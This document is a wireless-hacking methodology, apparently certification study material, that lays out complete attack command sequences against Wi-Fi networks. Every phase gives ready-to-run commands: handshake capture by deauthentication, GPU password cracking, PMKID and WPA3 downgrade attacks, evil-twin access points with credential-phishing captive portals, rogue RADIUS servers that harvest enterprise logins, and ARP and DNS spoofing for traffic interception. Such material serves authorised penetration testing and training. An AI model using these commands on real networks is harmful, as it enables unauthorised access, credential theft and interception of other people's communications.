# Wireless Network Attack Methodology

> Based on CEH Module 16 — Wireless Hacking

## Overview

Wireless networks remain a high-value attack surface. A compromised Wi-Fi network gives the attacker a foothold inside the network perimeter. This methodology covers reconnaissance through post-exploitation on 802.11 networks.

**Hardware Requirements**:
- USB wireless adapter with monitor mode and packet injection support
- Recommended chipsets: Atheros AR9271 (ALFA AWUS036NHA), Realtek RTL8812AU (ALFA AWUS036ACH), MediaTek MT7612U (Panda PAU0D)
- For WPA-Enterprise: A laptop to run a rogue RADIUS server
- Optional: Directional antenna for long-range capture, GPS for wardriving

---

## Phase 1: Interface Setup and Discovery

### Enable Monitor Mode

```bash
# Check for interfering processes
sudo airmon-ng check

# Kill interfering processes
sudo airmon-ng check kill

# Enable monitor mode on wlan0
sudo airmon-ng start wlan0
# Interface is now wlan0mon (or wlan0 with mon suffix)

# Verify monitor mode is active
iwconfig wlan0mon

# Alternative manual method
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# Set specific channel
sudo iw dev wlan0mon set channel 6
```

### Scan for Networks

```bash
# Scan all channels for all networks
sudo airodump-ng wlan0mon

# Filter by band (2.4 GHz only)
sudo airodump-ng --band a wlan0mon       # 5 GHz
sudo airodump-ng --band bg wlan0mon      # 2.4 GHz
sudo airodump-ng --band abg wlan0mon     # All bands

# Target a specific channel
sudo airodump-ng -c 6 wlan0mon

# Target a specific BSSID and write output to file
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Output column meanings:
#   BSSID    = AP MAC address
#   PWR      = Signal strength (closer to 0 = stronger)
#   Beacons  = Number of beacon frames
#   #Data    = Number of data frames (need these for cracking)
#   CH       = Channel
#   ENC      = Encryption (WPA2, WPA, WEP, OPN)
#   CIPHER   = CCMP (AES) or TKIP
#   AUTH     = PSK or MGT (Enterprise)
#   ESSID    = Network name
#   STATION  = Connected client MAC addresses
```

### Packet Injection Test

```bash
# Verify your adapter can inject packets
sudo aireplay-ng --test wlan0mon

# Test injection on a specific channel against a specific AP
sudo aireplay-ng --test -a AA:BB:CC:DD:EE:FF wlan0mon
```

---

## Phase 2: WPA/WPA2-PSK Cracking

### Capture the 4-Way Handshake

```bash
# Start capture on the target AP channel
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake_capture wlan0mon

# In another terminal, deauthenticate a client to force reconnection
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
#   -0 5 = send 5 deauth frames
#   -a   = AP BSSID
#   -c   = client MAC (omit to deauth all clients)

# Wait for "WPA handshake: AA:BB:CC:DD:EE:FF" in airodump-ng output
# The .cap file now contains the handshake

# Verify handshake was captured
aircrack-ng handshake_capture-01.cap
```

### Crack with aircrack-ng

```bash
# Dictionary attack
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF handshake_capture-01.cap

# With multiple wordlists
aircrack-ng -w wordlist1.txt,wordlist2.txt handshake_capture-01.cap
```

### Crack with hashcat (GPU-accelerated)

```bash
# Convert .cap to hashcat format (.hc22000)
hcxpcapngtool -o hash.hc22000 handshake_capture-01.cap

# If hcxpcapngtool is not available, use cap2hccapx (older method)
cap2hccapx handshake_capture-01.cap hash.hccapx

# Crack with hashcat (mode 22000 for WPA-PBKDF2-PMKID+EAPOL)
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# With rules
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# With mask (e.g., 8-digit numeric password)
hashcat -m 22000 hash.hc22000 -a 3 '?d?d?d?d?d?d?d?d'

# Common Wi-Fi password patterns
hashcat -m 22000 hash.hc22000 -a 3 '?u?l?l?l?l?l?d?d'       # Abcdef12
hashcat -m 22000 hash.hc22000 -a 3 '?d?d?d?d?d?d?d?d?d?d'   # 10-digit phone number
```

---

## Phase 3: PMKID Attack (Clientless)

No need to wait for a client handshake. Works against WPA/WPA2-PSK APs that support PMKID in the first EAPOL message.

```bash
# Capture PMKID using hcxdumptool
sudo hcxdumptool -i wlan0mon -o pmkid_dump.pcapng --active_beacon --enable_status=15

# Target a specific AP
sudo hcxdumptool -i wlan0mon -o pmkid_dump.pcapng --filterlist_ap=targets.txt --filtermode=2

# targets.txt contains BSSIDs (one per line, no colons):
# AABBCCDDEEFF

# Wait for "FOUND PMKID" message, then stop capture

# Convert to hashcat format
hcxpcapngtool -o pmkid_hash.hc22000 pmkid_dump.pcapng

# Crack with hashcat
hashcat -m 22000 pmkid_hash.hc22000 /usr/share/wordlists/rockyou.txt
```

---

## Phase 4: WPA3-SAE Considerations

WPA3 uses Simultaneous Authentication of Equals (SAE), which resists offline dictionary attacks. However, implementation flaws exist.

```bash
# Dragonblood attacks (CVE-2019-9494, CVE-2019-9496)
# These target WPA3 transition mode or implementation bugs

# Check if AP supports WPA3 transition mode (WPA2+WPA3)
sudo airodump-ng wlan0mon
# Look for "SAE" in AUTH column; transition mode shows "PSK SAE"

# In transition mode, force downgrade to WPA2 by targeting WPA2 clients
# Then capture standard WPA2 handshake and crack normally

# Timing-based side channel (Dragonblood)
# Use dragondrain to test for timing leaks
python3 dragondrain.py -i wlan0mon -t AA:BB:CC:DD:EE:FF -s "NetworkName"
```

---

## Phase 5: Evil Twin Attack

Create a rogue AP that mimics the legitimate network to capture credentials or perform MITM.

### Setup with hostapd

```bash
# /etc/hostapd/hostapd.conf
cat > /tmp/hostapd.conf << 'HOSTAPD'
interface=wlan0
driver=nl80211
ssid=TargetNetwork
hw_mode=g
channel=6
wmm_enabled=0
auth_algs=1
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_passphrase=temporarypassword
rsn_pairwise=CCMP
HOSTAPD

# For open captive portal (no WPA):
cat > /tmp/hostapd_open.conf << 'HOSTAPD'
interface=wlan0
driver=nl80211
ssid=FreeWiFi
hw_mode=g
channel=6
wmm_enabled=0
HOSTAPD
```

### DHCP with dnsmasq

```bash
# Configure interface
sudo ip addr add 192.168.1.1/24 dev wlan0

# /tmp/dnsmasq.conf
cat > /tmp/dnsmasq.conf << 'DNSMASQ'
interface=wlan0
dhcp-range=192.168.1.10,192.168.1.250,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
address=/#/192.168.1.1
DNSMASQ

# Start services
sudo hostapd /tmp/hostapd_open.conf &
sudo dnsmasq -C /tmp/dnsmasq.conf -d &

# Enable IP forwarding and NAT
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
sudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT
```

### Captive Portal

```bash
# Redirect HTTP traffic to local web server
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080

# Start a simple captive portal with Python
# Serve a phishing page that collects credentials
python3 -m http.server 8080 --directory /tmp/captive_portal/

# Or use a dedicated tool like Wifiphisher
sudo wifiphisher -aI wlan0mon -eI wlan1 --essid "TargetNetwork" -p firmware-upgrade
```

### Automated Evil Twin with Fluxion

```bash
# Fluxion automates the entire Evil Twin + captive portal workflow
sudo fluxion
# Follow the interactive menu:
# 1. Scan for target networks
# 2. Select target AP
# 3. Choose attack (Captive Portal)
# 4. Select handshake capture method
# 5. Capture handshake
# 6. Launch Evil Twin with captive portal
# 7. Wait for victim to enter Wi-Fi password
```

---

## Phase 6: WPA-Enterprise (802.1X) Attacks

### Rogue RADIUS with hostapd-mana or freeradius-wpe

```bash
# Install freeradius-wpe (Wireless Pwnage Edition)
# Patched FreeRADIUS that accepts and logs all credentials

# Generate certificates
cd /etc/freeradius-wpe/certs/
./bootstrap

# hostapd-mana config for WPA-Enterprise evil twin
cat > /tmp/hostapd_enterprise.conf << 'CONF'
interface=wlan0
driver=nl80211
ssid=CorpWiFi
channel=6
hw_mode=g
wpa=2
wpa_key_mgmt=WPA-EAP
ieee8021x=1
eap_server=1
eap_user_file=/tmp/eap_users
ca_cert=/etc/freeradius-wpe/certs/ca.pem
server_cert=/etc/freeradius-wpe/certs/server.pem
private_key=/etc/freeradius-wpe/certs/server.key
private_key_passwd=whatever
mana_wpe=1
mana_eapjack=1
CONF

# eap_users file
cat > /tmp/eap_users << 'USERS'
*   PEAP,TTLS,TLS,FAST,MD5,GTC
"t" TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2 "t" [2]
USERS

# Start the rogue AP
sudo hostapd-mana /tmp/hostapd_enterprise.conf

# Captured credentials appear in the hostapd-mana output
# MSCHAPv2 challenges can be cracked with asleap or hashcat
asleap -C CHALLENGE -R RESPONSE -W /usr/share/wordlists/rockyou.txt
# hashcat mode 5500 for NetNTLMv1 (MSCHAPv2)
```

### EAP Downgrade

```bash
# hostapd-mana can force EAP downgrade from MSCHAPv2 to GTC
# GTC sends passwords in plaintext
# Enable with: mana_eapjack=1 in hostapd config

# EAPHammer — automated WPA-Enterprise attacks
sudo eaphammer -i wlan0 --essid CorpWiFi --channel 6 --auth wpa-eap --creds
```

---

## Phase 7: Post-Exploitation on Wireless Network

Once connected to the target Wi-Fi network, you are inside the network perimeter.

### Network Discovery

```bash
# ARP scan to discover live hosts
sudo arp-scan -I wlan0 -l
sudo arp-scan -I wlan0 192.168.1.0/24

# Nmap host discovery
nmap -sn 192.168.1.0/24

# Identify the gateway and DNS
ip route show
cat /etc/resolv.conf
```

### MITM Attacks

```bash
# ARP spoofing with arpspoof
sudo sysctl -w net.ipv4.ip_forward=1
sudo arpspoof -i wlan0 -t 192.168.1.100 192.168.1.1    # Poison victim
sudo arpspoof -i wlan0 -t 192.168.1.1 192.168.1.100    # Poison gateway (other terminal)

# Bettercap — modern MITM framework
sudo bettercap -iface wlan0
# Inside bettercap:
net.probe on
net.sniff on
set arp.spoof.targets 192.168.1.100
arp.spoof on
set dns.spoof.domains *.corp.local
set dns.spoof.address 192.168.1.50
dns.spoof on
```

### DNS Spoofing

```bash
# Ettercap DNS spoofing
# Edit /etc/ettercap/etter.dns:
#   *.corp.local  A  192.168.1.50
sudo ettercap -T -q -i wlan0 -P dns_spoof -M arp:remote /192.168.1.100// /192.168.1.1//

# Bettercap DNS spoofing (see above)
```

### Credential Capture

```bash
# Capture credentials from unencrypted protocols
sudo net-creds -i wlan0

# Responder (capture LLMNR/NBT-NS/MDNS credentials)
sudo responder -I wlan0 -wrFd

# tcpdump for targeted capture
sudo tcpdump -i wlan0 -w post_exploit_capture.pcap
```

---

## Cleanup

```bash
# Stop monitor mode
sudo airmon-ng stop wlan0mon

# Restart NetworkManager
sudo systemctl start NetworkManager

# Flush iptables rules
sudo iptables -F
sudo iptables -t nat -F

# Disable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=0

# Kill remaining processes
sudo killall hostapd dnsmasq 2>/dev/null
```

---

## Quick Reference — Attack Selection

| Scenario | Attack | Tool |
|----------|--------|------|
| WPA2-PSK, clients connected | Handshake capture + crack | airodump + aireplay + hashcat |
| WPA2-PSK, no clients | PMKID capture | hcxdumptool + hashcat |
| WPA2-Enterprise | Evil Twin + rogue RADIUS | hostapd-mana / EAPHammer |
| WPA3-SAE (transition mode) | Downgrade to WPA2, then crack | airodump + hashcat |
| WPA3-SAE (only) | Dragonblood side-channel | dragondrain / dragontime |
| Open network | Evil Twin + captive portal | hostapd + dnsmasq |
| WEP (legacy) | IV capture + crack | airodump + aireplay + aircrack |
| Post-compromise | ARP spoof + sniff | bettercap / arpspoof |
